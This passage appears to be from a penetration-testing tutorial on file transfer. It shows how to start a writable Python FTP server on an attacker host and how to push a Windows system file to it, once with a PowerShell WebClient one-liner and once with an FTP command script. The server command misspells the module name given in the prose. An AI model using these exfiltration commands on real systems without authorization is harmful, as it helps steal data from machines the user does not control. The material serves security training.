----
Uploading files using FTP is very similar to downloading files. We can use PowerShell or the FTP client to complete the operation. Before we start our FTP Server using the Python module `pyftpdlib`, we need to specify the option `--write` to allow clients to upload files to our attack host.

```bash
sudo python3 -m pyftplib --port 21 --write
```

Now let's use the PowerShell upload function to upload a file to our FTP Server.

```powershell
(New-Object Net.WebClient).UploadFile('ftp://<ftp-ip>/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
```

#### Create a Command File for the FTP Client to Upload a File

```cmd-session
echo open <FTP-ip> > ftpcommand.txt
echo USER anonymous >> ftpcommand.txt
echo binary >> ftpcommand.txt
echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
echo bye >> ftpcommand.txt
ftp -v -n -s:ftpcommand.txt
```
